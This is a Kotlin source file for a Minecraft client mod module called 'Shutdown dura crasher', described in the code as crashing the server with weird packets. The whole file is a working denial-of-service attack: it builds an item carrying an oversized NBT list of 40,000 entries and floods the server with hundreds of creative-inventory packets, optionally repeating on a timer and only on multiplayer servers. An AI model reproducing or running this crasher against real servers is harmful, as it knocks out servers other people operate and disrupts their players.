package de.florianmichael.tarasande_crasher.module

import de.florianmichael.tarasande_crasher.forcePacket
import net.minecraft.block.Blocks
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NbtCompound
import net.minecraft.nbt.NbtIntArray
import net.minecraft.nbt.NbtList
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket
import net.minecraft.text.Text
import net.tarasandedevelopment.tarasande.event.impl.EventDisconnect
import net.tarasandedevelopment.tarasande.event.impl.EventUpdate
import net.tarasandedevelopment.tarasande.mc
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueBoolean
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module
import net.tarasandedevelopment.tarasande.util.math.TimeUtil
import java.util.concurrent.CompletableFuture

class ModuleShutdownDuraCrasher : Module("Shutdown dura crasher", "Crashes the server using weird packets", "Crasher") {

    private val repeat = ValueBoolean(this, "Repeat", false)
    private val repeatDelay = ValueNumber(this, "Repeat delay", 500.0, 1000.0, 50000.0, 500.0, isEnabled = { repeat.value })

    private val timer = TimeUtil()

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }
        registerEvent(EventUpdate::class.java) {
            if (repeat.value) {
                if (timer.hasReached(repeatDelay.value.toLong())) {
                    execute()
                    timer.reset()
                }
            }
        }
    }

    override fun onEnable() {
        super.onEnable()
        if (!repeat.value) execute()
    }

    private fun execute() {
        if (mc.isInSingleplayer) return

        CompletableFuture.runAsync {
            ItemStack(Blocks.OAK_PLANKS, 64).apply {
                val base = NbtCompound()
                val randomList = NbtList()
                for (i in 0 .. 39999){
                    randomList.add(NbtIntArray(intArrayOf(1, 1)))
                }
                base.put("Den hast du nicht ~Flori2007 (2020)", randomList)
                nbt = base
                setCustomName(Text.literal("Laggt ein bisschen"))
                for (i in 0..9)
                    for (j in 0..43)
                        forcePacket(CreativeInventoryActionC2SPacket(j, this))
            }
        }
    }
}